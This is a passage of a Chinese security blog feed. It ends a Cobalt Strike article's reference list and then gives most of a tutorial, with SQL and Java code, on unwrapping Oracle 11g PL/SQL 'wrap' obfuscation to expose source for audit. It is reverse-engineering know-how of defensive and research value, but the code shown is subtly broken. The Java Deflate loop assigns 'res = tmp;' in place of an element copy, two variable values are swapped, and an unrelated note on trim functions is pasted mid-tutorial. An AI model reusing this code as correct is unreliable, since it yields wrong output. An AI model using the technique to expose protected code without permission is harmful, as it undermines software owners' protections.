href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></li><li><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></li><li><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></li><li><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></li><li><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></li><li><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></li><li><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></li><li><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></li><li><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></li><li><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></li><li><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></li><li><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by Tahir 2021.6.8&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-Cobalt-Strike-模块详解&quot;&gt;&lt;a href=&quot;#1-Cobalt-Strike-模块详解&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database 11g Wrap加密解密分析</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</id>
    <published>2021-07-03T03:17:57.000Z</published>
    <updated>2021-07-03T03:22:48.962Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>​        Oracle为PL/SQL开发者提供的一种对他们所写的代码（oracle下的对象Package、Procedure、Function、Java Source等）进行加密的工具。当PL/SQL代码被加密以后，它就被描述为被“包装过”。使wrap工具对代码进行包装，wrap工具会取出含有要包装的代码的文件名并输出下面的文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrap <span class="attribute">iname</span>=plain.sql <span class="attribute">oname</span>=encrypted.plb</span><br></pre></td></tr></table></figure><p>​        因为代码被加密了，所以其细节被隐藏了，而且Oracle不提供解包装设备。但是我们可以编写我们自己的unwrap程序。</p><h2 id="1-Oracle-Wrap的文件格式"><a href="#1-Oracle-Wrap的文件格式" class="headerlink" title="1. Oracle Wrap的文件格式"></a>1. Oracle Wrap的文件格式</h2><p>​        Oracle为了防止自己的对象程序源码泄露，也对其做了wrap处理。因为许多PACKAGE、PROCEDURE等程序本身可能存在SQL注入漏洞，但是如果得不到源码，对其进行审计是很困难的。这样wrap在一定程度上也起到了保护作用。</p><p>​        这里随便找一个Oracle的PACKAGE为实例，这里我们找到kupd$data包程序，其代码如图所示：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/1.png"></p><p>​        可以将所有被warp加密的*.plb文件内容，分为header和body（BASE64）。header包含有关被加密包的数据库版本，对象类型以及加密和未加密文本的长度信息。</p><p>​        body包含使用BASE64编码的实际被加密的代码。</p><p>​        header格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. CREATE OR REPLACE PACKAGE kupd$data wrapped </span><br><span class="line">2. a000000</span><br><span class="line">3. 1</span><br><span class="line">4. abcd</span><br><span class="line">5. abcd</span><br><span class="line">6. abcd</span><br><span class="line">7. abcd</span><br><span class="line">8. abcd</span><br><span class="line">9. abcd</span><br><span class="line">10. abcd</span><br><span class="line">11. abcd</span><br><span class="line">12. abcd</span><br><span class="line">13. abcd</span><br><span class="line">14. abcd</span><br><span class="line">15. abcd</span><br><span class="line">16. abcd</span><br><span class="line">17. abcd</span><br><span class="line">18. abcd</span><br><span class="line">19. 9</span><br><span class="line">20. abb 42e</span><br></pre></td></tr></table></figure><p>​        展开.plb文件时，可以忽略前20行。包装的代码的header提供有关PL/SQL代码类型的一些信息，下面是header的一些字段（不过，实际上，不需要它们来解密PL/SQL）</p><p>​        第3行：<br>​        看起来像是数据库服务器相关的十六进制值，但是在大多数情况下，它们等于1。因此，使用此标头记录没有实际值。</p><p>​        第19行：<br>​        一个十六进制值，指定PL / SQL对象的类型（所有PL / SQL对象的类型）：</p><table><thead><tr><th align="left">十六进制</th><th align="left">对象类型</th></tr></thead><tbody><tr><td align="left">7</td><td align="left">过程</td></tr><tr><td align="left">8</td><td align="left">函数</td></tr><tr><td align="left">9</td><td align="left">包</td></tr><tr><td align="left">b</td><td align="left">包体</td></tr><tr><td align="left">d</td><td align="left">类型</td></tr><tr><td align="left">e</td><td align="left">类型体</td></tr></tbody></table><p>​        第20行：</p><p>​        header的最后一行包含两个十六进制值，中间用空格分隔。这些值包含长度信息。第一个值包含未加密文本的长度<strong>（不包含CREATE OR REPLACE部分）</strong>。第二个值包含不带标题且不带结尾LF（0x0A）和“ /”符号的包体的长度。</p><p>​        body</p><p>​        如前所述，加密的PL / SQL文本是BASE64编码的，需要解码后才能真正开始解包（解密）。BASE64解码主体的前20个字节包含包装（加密）主体的SHA1哈希值。主体的其余部分是一个编码的（使用编码表）压缩的字节流，其中包含源文本。</p><h2 id="2-Oracle-Wrap的加密机制"><a href="#2-Oracle-Wrap的加密机制" class="headerlink" title="2. Oracle Wrap的加密机制"></a>2. Oracle Wrap的加密机制</h2><p>​        Oracle加密的原理就是先对源码进行lz压缩，得到lz压缩串，然后对压缩串进行SHA-1运算得到40位的加密串，然后将加密串与压缩串拼接得到拼接字符串，然后对拼接字符串进行Oracle双字符转换（转换表）。最后将转换后的字符串进行base64编码，最终得到wrap的加密串。</p><h2 id="3-Unwrap反向解密"><a href="#3-Unwrap反向解密" class="headerlink" title="3. Unwrap反向解密"></a>3. Unwrap反向解密</h2><p>​        通过上面的加密机制，反向操作达到解密目的。</p><h3 id="3-1-base64解码得到Oracle双字符转换后字符串"><a href="#3-1-base64解码得到Oracle双字符转换后字符串" class="headerlink" title="3.1 base64解码得到Oracle双字符转换后字符串"></a>3.1 base64解码得到Oracle双字符转换后字符串</h3><p>​        首先，我们以一小段PL/SQL代码来测试分先加密字符串的结构，这里我先讲程序加密处理。如图所示，这里将create procedure a代码wrap之后变成了如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_ddl_wrap(&#x27;create procedure a&#x27;) from dual;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/2.png"></p><p>​        为了进一步分析其加密字符串中的结构，我们利用如下print_warpped_str.sql代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with src as</span><br><span class="line">( select &#x27;procedure a&#x27; txt from dual ), wrap as</span><br><span class="line">( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )</span><br><span class="line">select rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)) from wrap;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8BgMHdmA3Qg9IbJmntlZoZQoHwcwg5nnm7+fMr2ywFxakaamb40d1Q==</span><br></pre></td></tr></table></figure><p>​        ps:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">oracle中trim，ltrim，rtrim函数用法</span><br><span class="line"></span><br><span class="line">oracle中trim，ltrim，rtrim函数用法</span><br><span class="line">该函数共有两种作用：</span><br><span class="line">第一种，即去除空格。</span><br><span class="line">例子：</span><br><span class="line">--TRIM去除指定字符的前后空格</span><br><span class="line">SQL&gt; SELECT TRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">TRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\------------</span><br><span class="line">dd df</span><br><span class="line"></span><br><span class="line">--LTRIM去除指定字符的前面空格</span><br><span class="line">SQL&gt; SELECT LTRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">LTRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\-------------</span><br><span class="line">dd df</span><br><span class="line"></span><br><span class="line">--RTRIM去除指定字符后面后空格</span><br><span class="line">SQL&gt; SELECT RTRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">RTRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\-------------</span><br><span class="line"> dd df</span><br><span class="line"></span><br><span class="line">第二种，去除指定的字符。trim只能去除单个字符，而ltrim和rtrim可以去除多个字符。</span><br><span class="line">trim去除字符的写法：</span><br><span class="line">--表示字符串string2去除前面|后面|前后面（leading|trailing|both）的字符string1，默认去除方式为both</span><br><span class="line">SELECT TRIM(leading|trailing|both string1 FROM string2) FROM dual;</span><br><span class="line">例子：</span><br><span class="line">SQL&gt; SELECT trim(leading &#x27;d&#x27; from &#x27;dfssa&#x27;) FROM dual;</span><br><span class="line">TRIM(LEADING&#x27;D&#x27;FROM&#x27;DFSSA&#x27;)</span><br><span class="line">\---------------------------</span><br><span class="line">fssa</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT trim(both &#x27;1&#x27; from &#x27;123sfd111&#x27;) FROM dual;</span><br><span class="line">TRIM(BOTH&#x27;1&#x27;FROM&#x27;123SFD111&#x27;)</span><br><span class="line">\----------------------------</span><br><span class="line">23sfd</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT trim(trailing &#x27;2&#x27; from &#x27;213dsq12&#x27;) FROM dual;</span><br><span class="line">TRIM(TRAILING&#x27;2&#x27;FROM&#x27;213DSQ12&#x27;)</span><br><span class="line">\------------------------------</span><br><span class="line">213dsq1</span><br></pre></td></tr></table></figure><p>​        进一步对这段代码做base64解码，获得经过Oracle双字符转换后的字符串，如图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with src as</span><br><span class="line">( select &#x27;procedure a&#x27; txt from dual ), wrap as</span><br><span class="line">( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )</span><br><span class="line">select utl_encode.base64_decode( utl_raw.cast_to_raw( rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)))) from wrap;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F0180C1DD980DD083D21B2669ED959A194281F07308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5</span><br></pre></td></tr></table></figure><p>因为字符串是由两部分组成，先经过LZ压缩，然后经过SHA-1处理，然后再将SHA-1字符串和压缩字符串拼接得到，因为SHA-1总共40位，所以40位以后的全为经过Oracle双字符转换的压缩串，也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5</span><br></pre></td></tr></table></figure><h3 id="3-2-计算Oracle双字符转换表"><a href="#3-2-计算Oracle双字符转换表" class="headerlink" title="3.2 计算Oracle双字符转换表"></a>3.2 计算Oracle双字符转换表</h3><p>​        当wrap完成sha-1字符串和压缩字符串的拼接之后，会对照一个字符代替表进行Oracle双字符转换。这个表可能是Oracle的商业机密，所以官方没有给出该表的信息。</p><p>​        但是，我们已经得到了经过字符转换之后的LZ压缩串，同时我们可以通过LZ算法得到的LZ压缩串，通过对比这两个字符串，我们便可以推算出这个转换表。</p><h4 id="3-2-1-创建LZ压缩包"><a href="#3-2-1-创建LZ压缩包" class="headerlink" title="3.2.1 创建LZ压缩包"></a>3.2.1 创建LZ压缩包</h4><p>​        关于LZ压缩，这里用老外提供的一个JAVA包，为了爆破转换表，我们先把JAVA包创建好，用以进行LZ压缩与解压，LZ_java.sql，如下所示（用SYS用户）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">create or replace java source named UNWRAPPER</span><br><span class="line">as</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.zip.*;</span><br><span class="line"></span><br><span class="line">public class UNWRAPPER</span><br><span class="line">&#123;</span><br><span class="line">  public static String Inflate( byte[] src )</span><br><span class="line">  &#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      ByteArrayInputStream bis = new ByteArrayInputStream( src );</span><br><span class="line">      InflaterInputStream iis = new InflaterInputStream( bis );</span><br><span class="line">      StringBuffer sb = new StringBuffer();</span><br><span class="line">      for( int c = iis.read(); c != -1; c = iis.read() )</span><br><span class="line">      &#123;</span><br><span class="line">        sb.append( (char) c );</span><br><span class="line">      &#125;</span><br><span class="line">      return sb.toString();</span><br><span class="line">    &#125; catch ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  public static byte[] Deflate( String src, int quality )</span><br><span class="line">  &#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      byte[] tmp = new byte[ src.length() + 100 ];</span><br><span class="line">      Deflater defl = new Deflater( quality );</span><br><span class="line">      defl.setInput( src.getBytes( &quot;UTF-8&quot; ) );</span><br><span class="line">      defl.finish();</span><br><span class="line">      int cnt = defl.deflate( tmp );</span><br><span class="line">      byte[] res = new byte[ cnt ];</span><br><span class="line">      for( int i = 0; i &lt; cnt; i++ )</span><br><span class="line">        res = tmp;</span><br><span class="line">      return res;</span><br><span class="line">    &#125; catch ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">alter java source UNWRAPPER compile</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>​        这里deflate函数实现LZ压缩，而inflate则实现解压。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/5.png"></p><p>​        然后用包把JAVA声明进来，create_amosunwrapper.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">create or replace package amosunwrapper</span><br><span class="line">is</span><br><span class="line">  function deflate( src in varchar2 )</span><br><span class="line">  return raw;</span><br><span class="line">  function deflate( src in varchar2, quality in number )</span><br><span class="line">  return raw;</span><br><span class="line">  function inflate( src in raw )</span><br><span class="line">  return varchar2;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">create or replace package body amosunwrapper</span><br><span class="line">is</span><br><span class="line">  function deflate( src in varchar2 )</span><br><span class="line">  return raw</span><br><span class="line">  is</span><br><span class="line">  begin</span><br><span class="line">    return deflate( src, 6 );</span><br><span class="line">  end;</span><br><span class="line"></span><br><span class="line">  function deflate( src in varchar2, quality in number )</span><br><span class="line">  return raw</span><br><span class="line">  as language java</span><br><span class="line">  name &#x27;UNWRAPPER.Deflate( java.lang.String, int ) return byte[]&#x27;;</span><br><span class="line"></span><br><span class="line">  function inflate( src in raw )</span><br><span class="line">  return varchar2</span><br><span class="line">  as language java</span><br><span class="line">  name &#x27;UNWRAPPER.Inflate( byte[] ) return java.lang.String&#x27;;</span><br><span class="line"></span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/6.png"></p><h4 id="3-2-2-比较LZ压缩串和base64解码串"><a href="#3-2-2-比较LZ压缩串和base64解码串" class="headerlink" title="3.2.2 比较LZ压缩串和base64解码串"></a>3.2.2 比较LZ压缩串和base64解码串</h4><p>​        创建好LZ压缩包，来看一下，LZ串和base64解码串的对比，</p><p>​        首先，使用JAVA包，需要设置压缩级别参数，这个等级参数不一样，压缩得到的字符串完全不一样。我们可以从０等级开始一个一个进行测试，经过测试发现，Oracle用的是9等级。</p><p>​        所以，我们用以下代码对比两个字符串：comp_lz_and_base64.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">with src AS </span><br><span class="line">( select &#x27;procedure a&#x27; txt  from dual   ),</span><br><span class="line">wrap as   </span><br><span class="line">( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap  from src  ),</span><br><span class="line">     subst as  </span><br><span class="line"> (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) )  ) ), 41 ) x,</span><br><span class="line">amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap  )</span><br><span class="line">    select substr( x, r * 2 - 1, 2 )  c_base64,</span><br><span class="line">   substr( d, r * 2 - 1, 2 )  c_translatecode from subst  , </span><br><span class="line">   ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) );</span><br></pre></td></tr></table></figure><p>​        结果如下：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/7.png"></p><p>​        通过对结果的排序，没有出现同一个base64编码对应不同的十六进制的情况，因此我们知道了可以用这个SQL为基础，通过用不同的串来产生替换表的内容。</p><h4 id="3-2-3-计算替换表"><a href="#3-2-3-计算替换表" class="headerlink" title="3.2.3 计算替换表"></a>3.2.3 计算替换表</h4><p>​        首先建一个IDLTRANSLATE表来存储替换表的内容，create_idltranslate.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SYS.IDLTRANSLATE</span><br><span class="line">  (</span><br><span class="line">    C_BASE64DECODE  VARCHAR2(2) NOT NULL,</span><br><span class="line">    C_LZDEFLATECODE VARCHAR2(2)     NULL</span><br><span class="line">    )</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/8.png"></p><p>​        然后写一段PL/SQL块来生成替换表的内容，储存到IDLTRANSLATE表，generate_idltranslate.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">nCnt integer;</span><br><span class="line">nLoop integer;</span><br><span class="line">nSLoop integer;</span><br><span class="line">nCharmax integer;</span><br><span class="line">nCharmin integer;</span><br><span class="line">vChar Varchar2(3);</span><br><span class="line">cursor getchar is</span><br><span class="line">with src AS ( select &#x27;procedure &#x27;||vChar txt from dual ),</span><br><span class="line">wrap as ( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src ),</span><br><span class="line">subst as (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) ) ) ), 41 ) x,amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap )</span><br><span class="line">select substr( x, r*2 - 1, 2 ) xr ,substr( d, r*2 - 1, 2 ) dr from subst , ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) );</span><br><span class="line">begin</span><br><span class="line">nCharmax:=97;</span><br><span class="line">nCharmin:=122;</span><br><span class="line">For nLoop In 97..122 Loop</span><br><span class="line">For nSloop In 0..99 Loop</span><br><span class="line">vChar := chr(nLoop)||to_char(nSloop);</span><br><span class="line">For abc In getchar Loop</span><br><span class="line">Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr;</span><br><span class="line">If nCnt &lt; 1 Then</span><br><span class="line">Insert INTO sys.idltranslate VALUES (abc.xr,abc.dr);</span><br><span class="line">Commit;</span><br><span class="line">Else</span><br><span class="line">Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr AND c_lzdeflatecode=abc.dr;</span><br><span class="line">If nCnt &lt; 1 Then</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(&#x27;wrong orginal char:&#x27;||vchar||&#x27; hex base64:&#x27;||abc.xr);</span><br><span class="line">End If;</span><br><span class="line">End If;</span><br><span class="line">End Loop;</span><br><span class="line">End Loop;</span><br><span class="line">End Loop;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>​        等待运行一段时间</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/9.png"></p><p>​        筛选出sys.idltranslate表前10条数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sys.idltranslate where rownum&lt;=10;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/10.png"></p><p>​        运行上面这段SQL大概会产生200多条记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) c_base64decode from sys.idltranslate;</span><br></pre></td></tr></table></figure><p><img 